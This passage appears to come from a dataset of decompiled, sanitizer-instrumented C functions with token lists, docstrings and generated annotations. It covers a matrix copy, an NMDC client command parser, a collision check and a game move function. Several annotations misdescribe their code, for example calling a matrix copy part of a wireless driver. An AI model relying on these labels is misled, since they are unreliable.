            "=",
            "16",
            "*",
            "(",
            "4L",
            "L",
            "*",
            "v4",
            "+",
            "i",
            ")",
            "+",
            "v1",
            "+",
            "32",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_store16",
            "(",
            "v7",
            ")",
            ";",
            "v8",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v12",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v12",
            "+",
            "16",
            "*",
            "j",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v8",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v8",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "15",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v8",
            "+",
            "15",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "15",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load_n",
            "(",
            "v8",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "}",
            "v9",
            "=",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "352",
            "+",
            "16",
            "*",
            "(",
            "4L",
            "L",
            "*",
            "v4",
            "+",
            "i",
            ")",
            "-",
            "320",
            ")",
            ";",
            "v10",
            "=",
            "&",
            "v12",
            "[",
            "j",
            "]",
            ";",
            "v11",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v10",
            "-",
            ">",
            "c",
            ".",
            "g",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v9",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v10",
            "-",
            ">",
            "state",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v9",
            "+",
            "1",
            ")",
            "=",
            "v11",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D0E0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D120",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "4",
            ",",
            "4",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "m",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v15",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v1",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8020",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8020",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `an_stack` appears to be a part of a wireless networking driver, likely for Atheros hardware, involved in managing the stack's power save queue (PSQ) state for various operating modes and access point configurations.",
            "The `malloc` function in this context is used to allocate memory dynamically for various purposes within a C program, such as in algorithms like binary search, fannkuch permutation, tree data structures, and Mandelbrot set calculations, as demonstrated in the provided code snippets.",
            "The function `__readfsqword` is used to read an unsigned 64-bit integer from the FS segment register, likely for accessing thread-local storage or other system-specific data structures in low-level programming, particularly on x86 or x64 architectures."
        ],
        "longer_label": "The code snippet appears to be a part of a wireless driver for an IEEE 802.11 network, involving memory allocation, power-saving mechanism management, and low-level system programming tasks such as accessing Thread Information Blocks (TIBs) on Windows operating systems."
    },
    {
        "id": 212,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "receive",
            "commands",
            "from",
            "a",
            "client",
            ",",
            "parse",
            "and",
            "execute",
            "them",
            "based",
            "on",
            "specified",
            "flags",
            ",",
            "and",
            "break",
            "the",
            "loop",
            "when",
            "all",
            "specified",
            "flags",
            "are",
            "set",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "client_recv",
            "(",
            "int",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "size_t",
            "v2",
            ";",
            "unsigned",
            "int",
            "v3",
            ";",
            "size_t",
            "v4",
            ";",
            "char",
            "v6",
            "[",
            "4",
            "]",
            ";",
            "int",
            "v7",
            ";",
            "unsigned",
            "int",
            "v8",
            ";",
            "char",
            "v9",
            "[",
            "8",
            "]",
            ";",
            "char",
            "*",
            "i",
            ";",
            "__int64",
            "v11",
            ";",
            "void",
            "*",
            "s",
            ";",
            "void",
            "*",
            "dest",
            ";",
            "void",
            "*",
            "v14",
            ";",
            "void",
            "*",
            "v15",
            ";",
            "__int64",
            "v16",
            ";",
            "char",
            "v17",
            "[",
            "128",
            "]",
            ";",
            "char",
            "v18",
            "[",
            "1024",
            "]",
            ";",
            "char",
            "src",
            "[",
            "1032",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v20",
            ";",
            "v20",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "v7",
            "=",
            "1024",
            ";",
            "v11",
            "=",
            "0L",
            "L",
            ";",
            "s",
            "=",
            "malloc",
            "(",
            "0x401uL",
            "L",
            ")",
            ";",
            "dest",
            "=",
            "malloc",
            "(",
            "0x401uL",
            "L",
            ")",
            ";",
            "v14",
            "=",
            "malloc",
            "(",
            "0x401uL",
            "L",
            ")",
            ";",
            "v15",
            "=",
            "malloc",
            "(",
            "0x401uL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x401uL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "dest",
            ",",
            "0",
            ",",
            "0x401uL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "v14",
            ",",
            "0",
            ",",
            "0x401uL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "v15",
            ",",
            "0",
            ",",
            "0x401uL",
            "L",
            ")",
            ";",
            "do",
            "{",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "v7",
            "+",
            "1L",
            "L",
            ")",
            ";",
            "read",
            "(",
            "*",
            "a1",
            ",",
            "s",
            ",",
            "0x400uL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"client_recv: '%s'\\n\\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "s",
            ")",
            ";",
            "if",
            "(",
            "strchr",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "s",
            ",",
            "124",
            ")",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "(",
            "char",
            "*",
            ")",
            "s",
            ";",
            ";",
            "i",
            "=",
            "strchr",
            "(",
            "i",
            ",",
            "124",
            ")",
            "+",
            "1",
            ")",
            "{",
            "v2",
            "=",
            "strlen",
            "(",
            "i",
            ")",
            ";",
            "memccpy",
            "(",
            "dest",
            ",",
            "i",
            ",",
            "124",
            ",",
            "v2",
            ")",
            ";",
            "printf",
            "(",
            "\"fullcmd = '%s'\\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "dest",
            ")",
            ";",
            "v16",
            "=",
            "pcre_compile",
            "(",
            "\"(\\\\S+)(\\\\s|)(.*)\"",
            ",",
            "0L",
            "L",
            ",",
            "v9",
            ",",
            "v6",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "dest",
            ")",
            ";",
            "v8",
            "=",
            "pcre_exec",
            "(",
            "v16",
            ",",
            "0L",
            "L",
            ",",
            "dest",
            ",",
            "v3",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "v17",
            ",",
            "30L",
            "L",
            ")",
            ";",
            "pcre_copy_substring",
            "(",
            "dest",
            ",",
            "v17",
            ",",
            "v8",
            ",",
            "1L",
            "L",
            ",",
            "v18",
            ",",
            "1023L",
            "L",
            ")",
            ";",
            "pcre_copy_substring",
            "(",
            "dest",
            ",",
            "v17",
            ",",
            "v8",
            ",",
            "3L",
            "L",
            ",",
            "src",
            ",",
            "1023L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_compare",
            "(",
            "v18",
            ",",
            "\"$Lock\"",
            ")",
            "|",
            "|",
            "(",
            "a2",
            "&",
            "0x2000000000L",
            "L",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_compare",
            "(",
            "v18",
            ",",
            "\"$HubName\"",
            ")",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_compare",
            "(",
            "v18",
            ",",
            "\"$Hello\"",
            ")",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_compare",
            "(",
            "v18",
            ",",
            "\"$NickList\"",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_compare",
            "(",
            "v18",
            ",",
            "\"$OpList\"",
            ")",
            "&",
            "&",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_cmd_oplist",
            "(",
            "a1",
            ",",
            "src",
            ")",
            ")",
            "v11",
            "|",
            "=",
            "0x80000000uL",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_cmd_nicklist",
            "(",
            "a1",
            ",",
            "src",
            ")",
            ")",
            "{",
            "v11",
            "|",
            "=",
            "0x40000000uL",
            "L",
            ";",
            "}",
            "}",
            "else",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_cmd_hello",
            "(",
            "a1",
            ",",
            "src",
            ")",
            ")",
            "{",
            "v11",
            "|",
            "=",
            "0x4000000uL",
            "L",
            ";",
            "}",
            "}",
            "else",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_cmd_hubname",
            "(",
            "a1",
            ",",
            "src",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"Executed HubName...\"",
            ")",
            ";",
            "}",
            "}",
            "else",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "nmdc_cmd_lock",
            "(",
            "a1",
            ",",
            "src",
            ")",
            ")",
            "{",
            "v4",
            "=",
            "strlen",
            "(",
            "i",
            ")",
            ";",
            "memccpy",
            "(",
            "v14",
            ",",
            "src",
            ",",
            "32",
            ",",
            "v4",
            ")",
            ";",
            "printf",
            "(",
            "\"Received Lock = '%s'\\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "v14",
            ")",
            ";",
            "v11",
            "|",
            "=",
            "0x2000000000uL",
            "L",
            ";",
            "}",
            "printf",
            "(",
            "\"command = '%s'\\n\"",
            ",",
            "v18",
            ")",
            ";",
            "printf",
            "(",
            "\"arg = '%s'\\n\\n\"",
            ",",
            "src",
            ")",
            ";",
            "memset",
            "(",
            "dest",
            ",",
            "0",
            ",",
            "v7",
            ")",
            ";",
            "memset",
            "(",
            "v18",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "v18",
            ")",
            ")",
            ";",
            "memset",
            "(",
            "src",
            ",",
            "0",
            ",",
            "0x400uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strchr",
            "(",
            "i",
            ",",
            "124",
            ")",
            ")",
            "break",
            ";",
            "}",
            "}",
            "}",
            "while",
            "(",
            "(",
            "a2",
            "&",
            "v11",
            ")",
            "=",
            "=",
            "0",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v20",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is utilized to read an unsigned 64-bit integer from the FS segment register, often used for accessing thread-local storage (TLS) data on x86 architectures.",
            "The function `malloc` appears to be a memory allocation function that allocates memory space, likely implemented here using `GlobalAlloc`, and is used within a C program that includes various algorithms such as binary search, Fannkuch permutation, manipulation of binary trees, computation of Mandelbrot set, and other operations involving memory allocation and manipulation of data structures.",
            "The `memset` function is used to set a block of memory to a specific value, typically used for initializing or zeroing out memory buffers efficiently.",
            "The `printf` function, defined and used in the provided code snippets, implements a customized version of the printf function in C for output formatting, potentially including specific behaviors for handling special cases like Infinity and NaN, while also extending functionality to include operations like a Reverse Polish Notation (RPN) calculator."
        ],
        "longer_label": "The given code is a function in C that implements a client-side receiving functionality, reading data from a socket, parsing received commands delimited by '|' characters, and executing corresponding actions based on the received command, utilizing memory allocation, string manipulation, and PCRE (Perl Compatible Regular Expressions) library functions."
    },
    {
        "id": 213,
        "docstring_tokens": [
            "This",
            "code",
            "checks",
            "for",
            "collisions",
            "between",
            "a",
            "4x4",
            "matrix",
            "``",
            "m",
            "''",
            "placed",
            "at",
            "coordinates",
            "(",
            "x",
            ",",
            "y",
            ")",
            "within",
            "a",
            "larger",
            "matrix",
            "``",
            "s",
            "''",
            "of",
            "size",
            "N",
            "x",
            "M",
            "."
        ],
        "code_tokens": [
            "bool",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "N",
            ",",
            "int",
            "M",
            ",",
            "int",
            "x",
            ",",
            "int",
            "y",
            ",",
            "cell_0",
            "(",
            "*",
            "m",
            ")",
            "[",
            "4",
            "]",
            ",",
            "cell_0",
            "(",
            "*",
            "s",
            ")",
            "[",
            "]",
            ")",
            "{",
            "cell_0",
            "*",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "bool",
            "v8",
            ";",
            "char",
            "*",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "unsigned",
            "__int64",
            "v12",
            ";",
            "unsigned",
            "__int8",
            "v13",
            ";",
            "int",
            "j",
            ";",
            "int",
            "i",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "M",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22D2A0",
            ",",
            "M",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "v6",
            "=",
            "&",
            "(",
            "*",
            "m",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22D160",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v6",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v6",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D1A0",
            ",",
            "v6",
            ")",
            ";",
            "v7",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v6",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v6",
            "+",
            "16",
            "*",
            "j",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load1",
            "(",
            "&",
            "v6",
            "[",
            "j",
            "]",
            ")",
            ";",
            "}",
            "v8",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v7",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v7",
            ">",
            "1u",
            ")",
            "__ubsan_handle_load_invalid_value",
            "(",
            "&",
            "off_22F100",
            ",",
            "v8",
            ")",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "{",
            "if",
            "(",
            "__OFADD__",
            "(",
            "i",
            ",",
            "y",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D2E0",
            ",",
            "y",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "i",
            "+",
            "y",
            "<",
            "0",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "i",
            ",",
            "y",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D320",
            ",",
            "y",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "N",
            "<",
            "=",
            "i",
            "+",
            "y",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "j",
            ",",
            "x",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D360",
            ",",
            "x",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "j",
            "+",
            "x",
            "<",
            "0",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "j",
            ",",
            "x",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D3A0",
            ",",
            "x",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "M",
            "<",
            "=",
            "j",
            "+",
            "x",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "y",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D3E0",
            ",",
            "i",
            ",",
            "y",
            ")",
            ";",
            "v10",
            "=",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "16",
            "*",
            "(",
            "y",
            "+",
            "i",
            ")",
            "*",
            "(",
            "__int64",
            ")",
            "M",
            ";",
            "v11",
            "=",
            "x",
            "+",
            "j",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "x",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D420",
            ",",
            "j",
            ",",
            "x",
            ")",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "M",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22D460",
            ",",
            "M",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v11",
            ">",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "M",
            "-",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22D200",
            ",",
            "v11",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v10",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v10",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D240",
            ",",
            "v10",
            ")",
            ";",
            "v12",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v10",
            "[",
            "16",
            "*",
            "v11",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v12",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v10",
            "+",
            "16",
            "*",
            "v11",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v12",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load1",
            "(",
            "&",
            "v10",
            "[",
            "16",
            "*",
            "v11",
            "]",
            ")",
            ";",
            "}",
            "v13",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v12",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v12",
            ">",
            "1u",
            ")",
            "__ubsan_handle_load_invalid_value",
            "(",
            "&",
            "off_22F140",
            ",",
            "v13",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v13",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "return",
            "1",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D4A0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22D4E0",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `san_handle` appears to be a part of a larger codebase related to handling errors and exceptions, likely within a system involving flash memory management, socket I/O, and possibly dynamic type checking, with a focus on error reporting and potentially aborting program execution in case of violations, as indicated by the presence of error handling functions like `die` and `ABORT_VARIANT`.",
            "The function `sub_overflow` is used to detect overflow conditions when subtracting two unsigned 64-bit integers, ensuring the result fits within a specified number of bits.",
            "The function `san_handle_type` seems to handle various type mismatch errors and related issues, likely as part of a sanitizer implementation, providing specific handling for different types of mismatches such as add, subtract, multiply overflow, shift out of bounds, and null pointer dereferences.",
            "The \"mismatch\" function likely handles error cases or discrepancies within a program, such as bracket mismatches in a brainfuck compiler, endianness mismatches, or version mismatches in RPC calls, providing error messages and possibly terminating the program execution."
        ],
        "longer_label": "The given code defines a function `collision` which checks for collisions between two arrays of `cell_0` structs, with error handling for various types of overflows, out-of-bounds accesses, and type mismatches, likely used in a system involving flash memory management and socket I/O, focusing on error reporting and possibly aborting program execution."
    },
    {
        "id": 214,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "moveLeft",
            "''",
            "moves",
            "the",
            "game",
            "piece",
            "left",
            "if",
            "there",
            "is",
            "no",
            "collision",
            "detected",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "int",
            "y",
            ";",
            "int",
            "x",
            ";",
            "bool",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "m",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D520",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "y",
            "=",
            "g",
            "-",
            ">",
            "y",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D580",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "x",
            "=",
            "g",
            "-",
            ">",
            "x",
            ";",
            "v3",
            "=",
            "__OFSUB__",
            "(",
            "x",
            ",",
            "1",
            ")",
            ";",
            "v4",
            "=",
            "x",
            "-",
            "1",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22D760",
            ",",
            "g",
            "-",
            ">",
            "x",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v5",
            "=",
            "v4",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
